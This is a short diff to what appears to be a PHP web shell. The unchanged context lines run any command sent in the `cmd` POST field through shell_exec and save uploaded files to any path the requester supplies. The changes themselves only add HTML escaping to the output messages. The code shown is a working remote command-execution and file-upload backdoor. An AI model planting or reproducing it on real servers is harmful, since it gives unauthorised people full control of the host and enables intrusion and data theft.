@@ -3,7 +3,7 @@
 if (ISSET($_POST['cmd'])) {
     $output = preg_split('/[\n]/', shell_exec($_POST['cmd']." 2>&1"));
     foreach ($output as $line) {
-        echo htmlentities($line, ENT_QUOTES | ENT_HTML5, 'UTF-8')."<br>";
+        echo htmlentities($line, ENT_QUOTES | ENT_HTML5, 'UTF-8') . "<br>";
     }
     die(); 
 } else if (!empty($_FILES['file']['tmp_name']) && !empty($_POST['path'])) {
@@ -13,9 +13,9 @@ if (ISSET($_POST['cmd'])) {
         $path .= "/";
     } 
     if (move_uploaded_file($_FILES["file"]["tmp_name"], $path.$filename)) {
-        echo $filename." successfully uploaded to ".$path;
+        echo htmlentities($filename) . " successfully uploaded to " . htmlentities($path);
     } else {
-        echo "Error uploading ".$filename;
+        echo "Error uploading " . htmlentities($filename);
     }
     die();
 }
